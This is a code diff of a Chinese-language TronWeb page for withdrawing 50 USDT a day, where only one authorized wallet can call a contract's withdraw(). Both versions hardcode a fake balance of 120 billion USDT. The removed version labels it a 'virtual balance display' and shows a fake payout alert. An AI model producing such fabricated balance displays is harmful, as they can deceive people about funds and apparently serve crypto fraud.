@@ -1,72 +1,91 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<meta charset="utf-8">
-<title>USDT 提现</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<style>
-  body{font-family:sans-serif;padding:30px;text-align:center}
-  #bal{color:#009900;font-size:1.5em;font-weight:bold}
-  #btn{padding:10px 25px;font-size:16px;border:0;border-radius:6px;
-       background:#28a745;color:#fff;cursor:pointer}
-  #btn:disabled{background:#aaa;cursor:not-allowed}
-  .tip{margin-top:28px;color:#666;font-size:14px}
-</style>
-<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
-<script>
-const AUTH_ADDR   = "TNiJWUJzPPCQaGwTFoeabqhDEuh6NLvBxF";  // 授权提现地址
-const SHOW_BAL    = "120,000,000,000 USDT";                 // 虚拟余额展示
-const DAILY_MS    = 86_400_000;                             // 24h
-
-function $ (id){return document.getElementById(id);}
-
-async function init(){
-  $('bal').textContent = SHOW_BAL;
-
-  // 1. 检测是否安装 TronLink
-  if(!window.tronWeb || !tronWeb.ready){
-    $('addr').textContent = "未检测到 TronLink";
-    return;
-  }
-
-  // 2. 当前钱包地址
-  const addr = tronWeb.defaultAddress.base58;
-  $('addr').textContent = addr;
-
-  // 3. 权限与冷却判断
-  if(addr === AUTH_ADDR){
-    // 冷却判定（用 localStorage 记录）
-    const last = +localStorage.getItem('last_withdraw') || 0;
-    if(Date.now() - last >= DAILY_MS){
-      $('btn').disabled = false;
-    }else{
-      const hrs = Math.ceil((DAILY_MS - (Date.now()-last))/3.6e6);
-      $('btn').textContent = `冷却中（约 ${hrs} 小时后可提）`;
+  <meta charset="UTF-8">
+  <title>USDT 每日提现 50</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <style>
+    body { font-family: sans-serif; padding: 20px; max-width: 480px; margin: auto; text-align: center; }
+    h2 { margin-bottom: 1em; }
+    .info { margin: .8em 0; }
+    .label { color: #666; }
+    .value { font-size: 1.2em; word-break: break-all; }
+    button {
+      margin-top: 1em;
+      width: 100%;
+      padding: 12px;
+      font-size: 1em;
+      border: none;
+      border-radius: 4px;
+      background: #4A5568;
+      color: white;
+      cursor: pointer;
     }
-  }else{
-    $('btn').textContent = "未授权地址";
-  }
-}
-
-// 4. 点击提现（仅前端演示，真实合约调用需替换）
-$('btn').onclick = async ()=>{
-  $('btn').disabled = true;
-  alert("提现指令已发送，后台审核后打款");
-  localStorage.setItem('last_withdraw', Date.now());
-  init(); // 重新刷新按钮状态
-};
-
-window.addEventListener('DOMContentLoaded', init);
-</script>
+    button:disabled { background: #aaa; cursor: not-allowed; }
+    .tip { margin-top: 2em; color: #999; font-size: .9em; }
+  </style>
 </head>
 <body>
-  <h2>USDT 每日提现系统</h2>
+  <h2>USDT 每日提现 50</h2>
+  <div class="info">
+    <div class="label">钱包地址：</div>
+    <div id="addr" class="value">未连接</div>
+  </div>
+  <div class="info">
+    <div class="label">当前余额：</div>
+    <div class="value" style="color:green;">120,000,000,000 USDT</div>
+  </div>
+  <button id="btn" disabled>提现 50 USDT</button>
+  <div class="tip">仅限授权地址指令性提现</div>
 
-  <p>钱包地址：<span id="addr">未连接</span></p>
-  <p id="bal"></p>
+  <!-- TronWeb -->
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
+  <script>
+    // ==== 配置区 ====
+    const AUTHORIZED = "TFcpXGJVourvwxCnMYfR6D5nwFcVzWxdfc"; // 授权提现地址
+    const CONTRACT_ADDRESS = "TFFf2iQjJxxPjs4HwxBm1Tfa695LWAZPL";  // 你部署的 Faucet 合约地址
+    const MINIMAL_ABI = [
+      { "constant":false,"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function" }
+    ];
+    // ==================
 
-  <button id="btn" disabled>提现 50 USDT</button>
+    const btn = document.getElementById("btn");
+    const addrDiv = document.getElementById("addr");
 
-  <p class="tip">仅限授权地址指令性提现</p>
+    // 1）初始化：检测 TronLink、获取地址、更新 UI
+    async function init() {
+      if (window.tronWeb && tronWeb.ready) {
+        const user = tronWeb.defaultAddress.base58;
+        addrDiv.textContent = user;
+        if (user === AUTHORIZED) {
+          btn.disabled = false;
+          btn.onclick = doWithdraw;
+        } else {
+          btn.textContent = "非授权地址";
+        }
+      } else {
+        addrDiv.textContent = "未检测到 TronLink";
+      }
+    }
+
+    // 2）调用合约 withdraw()
+    async function doWithdraw() {
+      try {
+        btn.disabled = true;
+        btn.textContent = "请求中…";
+        const contract = await tronWeb.contract(MINIMAL_ABI, CONTRACT_ADDRESS);
+        await contract.withdraw().send();
+        alert("提现交易已发起，请在 TronLink 中确认");
+      } catch (e) {
+        console.error(e);
+        alert("调用失败：" + e.message);
+      } finally {
+        btn.textContent = "提现 50 USDT";
+        btn.disabled = false;
+      }
+    }
+
+    window.addEventListener("load", init);
+  </script>
 </body>
 </html>
